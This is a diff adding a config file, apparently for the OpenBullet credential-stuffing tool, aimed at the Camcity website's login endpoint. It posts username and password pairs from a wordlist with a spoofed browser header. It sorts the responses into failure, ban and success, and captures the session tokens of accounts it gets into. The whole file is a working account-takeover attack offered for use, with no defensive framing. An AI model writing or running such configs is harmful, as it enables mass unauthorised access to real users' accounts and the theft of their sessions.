@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Camcity",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-19T15:02:32.3355946+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.camcity.com/app/login/" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "accept-language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage" 
+  KEYCHAIN Ban OR 
+    KEY "Oops.You have been banned" 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "Oops.You have been banned" 
+    KEY "<SOURCE>" DoesNotContain "errorMessage" 
+PARSE "<SOURCE>" JSON "tokens" Recursive=FALSE -> CAP "tokens" "" "" 
